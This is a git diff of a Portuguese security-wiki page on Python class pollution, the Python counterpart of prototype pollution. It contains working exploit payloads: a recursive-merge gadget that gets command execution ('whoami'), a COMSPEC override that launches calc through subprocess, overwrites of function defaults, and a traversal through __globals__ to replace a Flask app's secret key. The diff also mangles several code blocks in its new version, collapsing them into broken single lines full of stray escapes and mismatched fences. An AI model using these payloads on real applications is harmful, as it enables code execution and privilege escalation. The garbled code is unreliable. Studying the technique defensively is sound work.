@@ -1,4 +1,6 @@
-# Poluição de Classe (Prototype Pollution do Python)
+# Class Pollution (Python's Prototype Pollution)
+
+## Poluição de Classe (Prototype Pollution do Python)
 
 <details>
 
@@ -12,9 +14,10 @@
 
 </details>
 
-## Exemplo Básico
+### Exemplo Básico
 
 Veja como é possível poluir classes de objetos com strings:
+
 ```python
 class Company: pass
 class Developer(Company): pass
@@ -38,7 +41,9 @@ e.__class__.__base__.__base__.__qualname__ = 'Polluted_Company'
 print(d) #<__main__.Polluted_Developer object at 0x1041d2b80>
 print(c) #<__main__.Polluted_Company object at 0x1043a72b0>
 ```
-## Exemplo Básico de Vulnerabilidade
+
+### Exemplo Básico de Vulnerabilidade
+
 ```python
 # Initial state
 class Employee: pass
@@ -71,57 +76,32 @@ USER_INPUT = {
 merge(USER_INPUT, emp)
 print(vars(emp)) #{'name': 'Ahemd', 'age': 23, 'manager': {'name': 'Sarah'}}
 ```
-## Exemplos de Gadget
+
+### Exemplos de Gadget
 
 <details>
 
 <summary>Criando valor padrão de propriedade de classe para RCE (subprocesso)</summary>
-```python
-from os import popen
-class Employee: pass # Creating an empty class
-class HR(Employee): pass # Class inherits from Employee class
-class Recruiter(HR): pass # Class inherits from HR class
 
-class SystemAdmin(Employee): # Class inherits from Employee class
-    def execute_command(self):
-        command = self.custom_command if hasattr(self, 'custom_command') else 'echo Hello there'
-        return f'[!] Executing: "{command}", output: "{popen(command).read().strip()}"'
+\`\`\`python from os import popen class Employee: pass # Creating an empty class class HR(Employee): pass # Class inherits from Employee class class Recruiter(HR): pass # Class inherits from HR class
 
-def merge(src, dst):
-    # Recursive merge function
-    for k, v in src.items():
-        if hasattr(dst, '__getitem__'):
-            if dst.get(k) and type(v) == dict:
-                merge(v, dst.get(k))
-            else:
-                dst[k] = v
-        elif hasattr(dst, k) and type(v) == dict:
-            merge(v, getattr(dst, k))
-        else:
-            setattr(dst, k, v)
+class SystemAdmin(Employee): # Class inherits from Employee class def execute\_command(self): command = self.custom\_command if hasattr(self, 'custom\_command') else 'echo Hello there' return f'\[!] Executing: "{command}", output: "{popen(command).read().strip()}"'
 
-USER_INPUT = {
-    "__class__":{
-        "__base__":{
-            "__base__":{
-                "custom_command": "whoami"
-            }
-        }
-    }
-}
+def merge(src, dst): # Recursive merge function for k, v in src.items(): if hasattr(dst, '**getitem**'): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst\[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v)
 
-recruiter_emp = Recruiter()
-system_admin_emp = SystemAdmin()
+USER\_INPUT = { "**class**":{ "**base**":{ "**base**":{ "custom\_command": "whoami" } } } }
 
-print(system_admin_emp.execute_command())
-#> [!] Executing: "echo Hello there", output: "Hello there"
+recruiter\_emp = Recruiter() system\_admin\_emp = SystemAdmin()
 
-# Create default value for Employee.custom_command
-merge(USER_INPUT, recruiter_emp)
+print(system\_admin\_emp.execute\_command()) #> \[!] Executing: "echo Hello there", output: "Hello there"
 
-print(system_admin_emp.execute_command())
-#> [!] Executing: "whoami", output: "abdulrah33m"
-```
+## Create default value for Employee.custom\_command
+
+merge(USER\_INPUT, recruiter\_emp)
+
+print(system\_admin\_emp.execute\_command()) #> \[!] Executing: "whoami", output: "abdulrah33m"
+
+````
 </details>
 
 <details>
@@ -134,11 +114,11 @@ Por exemplo, podemos poluir uma variável global chamada <code>SECRET_KEY</code>
 
 ```python
 globals()['SECRET_KEY'] = 'my_new_secret_key'
-```
+````
 
-Isso adicionará a variável <code>SECRET_KEY</code> ao dicionário global, tornando-a acessível em todo o código. Isso pode ser usado para substituir a chave secreta atual por uma nova, sem precisar modificar o arquivo de configuração original.
+Isso adicionará a variável `SECRET_KEY` ao dicionário global, tornando-a acessível em todo o código. Isso pode ser usado para substituir a chave secreta atual por uma nova, sem precisar modificar o arquivo de configuração original.
 
-Da mesma forma, podemos poluir outras classes adicionando novos atributos ou métodos a elas. Por exemplo, podemos adicionar um novo método <code>malicious_method</code> à classe <code>MyClass</code>:
+Da mesma forma, podemos poluir outras classes adicionando novos atributos ou métodos a elas. Por exemplo, podemos adicionar um novo método `malicious_method` à classe `MyClass`:
 
 ```python
 class MyClass:
@@ -148,7 +128,8 @@ class MyClass:
 globals()['MyClass'].malicious_method = lambda self: self.my_attribute
 ```
 
-Isso adicionará o método <code>malicious_method</code> à classe <code>MyClass</code>, permitindo que um invasor acesse o atributo <code>my_attribute</code> de qualquer instância de <code>MyClass</code>.
+Isso adicionará o método `malicious_method` à classe `MyClass`, permitindo que um invasor acesse o atributo `my_attribute` de qualquer instância de `MyClass`.
+
 ```python
 def merge(src, dst):
     # Recursive merge function
@@ -176,40 +157,32 @@ merge({'__class__':{'__init__':{'__globals__':{'not_accessible_variable':'Pollut
 print(not_accessible_variable) #> Polluted variable
 print(NotAccessibleClass) #> <class '__main__.PollutedClass'>
 ```
+
 </details>
 
 <details>
 
-<summary>Execução arbitrária de subprocessos</summary> 
+<summary>Execução arbitrária de subprocessos</summary>
+
+
 
 </details>
-```python
-import subprocess, json
 
-class Employee:
-    def __init__(self):
-        pass
+\`\`\`python import subprocess, json
 
-def merge(src, dst):
-    # Recursive merge function
-    for k, v in src.items():
-        if hasattr(dst, '__getitem__'):
-            if dst.get(k) and type(v) == dict:
-                merge(v, dst.get(k))
-            else:
-                dst[k] = v
-        elif hasattr(dst, k) and type(v) == dict:
-            merge(v, getattr(dst, k))
-        else:
-            setattr(dst, k, v)
+class Employee: def **init**(self): pass
 
-# Overwrite env var "COMSPEC" to execute a calc
-USER_INPUT = json.loads('{"__init__":{"__globals__":{"subprocess":{"os":{"environ":{"COMSPEC":"cmd /c calc"}}}}}}') # attacker-controlled value
+def merge(src, dst): # Recursive merge function for k, v in src.items(): if hasattr(dst, '**getitem**'): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst\[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v)
 
-merge(USER_INPUT, Employee())
+## Overwrite env var "COMSPEC" to execute a calc
+
+USER\_INPUT = json.loads('{"**init**":{"**globals**":{"subprocess":{"os":{"environ":{"COMSPEC":"cmd /c calc"\}}\}}\}}') # attacker-controlled value
+
+merge(USER\_INPUT, Employee())
 
 subprocess.Popen('whoami', shell=True) # Calc.exe will pop up
-```
+
+````
 </details>
 
 <details>
@@ -252,19 +225,20 @@ merge(emp_info, Employee())
 print(execute.__kwdefaults__) #> {'command': 'echo Polluted'}
 execute() #> Executing echo Polluted
 #> Polluted
-```
-</details>
+````
 
 <details>
 
 <summary>Sobrescrevendo segredo do Flask em diferentes arquivos</summary>
 
-Então, se você pode fazer uma poluição de classe em um objeto definido no arquivo principal do Python da web, mas **cuja classe é definida em um arquivo diferente** do principal. Porque, para acessar \_\_globals\_\_ nos payloads anteriores, você precisa acessar a classe do objeto ou métodos da classe, você será capaz de **acessar os globais naquele arquivo, mas não no principal**. \
+Então, se você pode fazer uma poluição de classe em um objeto definido no arquivo principal do Python da web, mas **cuja classe é definida em um arquivo diferente** do principal. Porque, para acessar \_\_globals\_\_ nos payloads anteriores, você precisa acessar a classe do objeto ou métodos da classe, você será capaz de **acessar os globais naquele arquivo, mas não no principal**.\
 Portanto, você **não poderá acessar o objeto global do aplicativo Flask** que definiu a **chave secreta** na página principal:
+
 ```python
 app = Flask(__name__, template_folder='templates')
 app.secret_key = '(:secret:)'
 ```
+
 Neste cenário, você precisa de um dispositivo para percorrer arquivos para chegar ao principal e **acessar o objeto global `app.secret_key`** para alterar a chave secreta do Flask e ser capaz de [**escalar privilégios** sabendo dessa chave](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).
 
 Um payload como este [deste writeup](https://ctftime.org/writeup/36082):
@@ -285,7 +259,7 @@ Confira também a seguinte página para mais gadgets somente de leitura:
 [python-internal-read-gadgets.md](python-internal-read-gadgets.md)
 {% endcontent-ref %}
 
-## Referências
+### Referências
 
 * [https://blog.abdulrah33m.com/prototype-pollution-in-python/](https://blog.abdulrah33m.com/prototype-pollution-in-python/)
 
